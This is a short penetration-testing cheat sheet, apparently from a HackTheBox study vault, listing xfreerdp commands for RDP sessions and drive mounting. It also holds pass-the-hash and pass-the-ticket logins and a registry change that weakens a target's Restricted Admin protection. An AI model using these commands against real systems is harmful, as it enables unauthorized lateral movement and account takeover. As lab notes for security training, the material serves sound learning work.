---
type: tool
category: rdp
tags:
  - tool
---
# Overview

## Quick Commands

### Standard RDP-Session (Password Auth):
```bash
xfreerdp /v:10.129.202.41 /u:USERNAME /p:'PASSWORD' /dynamic-resolution /cert:ignore
```

^70b0b1

^592b34
### More stable RDP-session:
```bash
xfreerdp /v:10.129.49.206 /u:USERNAME /p:'PASSWORD' /cert:ignore /w:1600 /h:900 /bpp:16 -gfx /network:auto +auto-reconnect /auto-reconnect-max-retries:10
```

### Mounting a Linux Folder Using xfreerdp
```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

#### Pass the Hash (using RDP)
```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /dynamic-resolution /cert:ignore
```

It is possible, that we run int following "error":
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260914165328.png)

This can be bypassed, by adding following registry key on the target:
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Pass the Ticket (using RDP)
```bash
xfreerdp /v:JUMP01.NEXURA.HTB /u:stom /d:NEXURA.HTB /kerberos:cache:"/tmp/krb5cc_stom" /cert:ignore
```
> [!INFO] Note
For this to work we need to add the `KDC` to the `/etc/krb5.conf` file! 


## Important Parameter
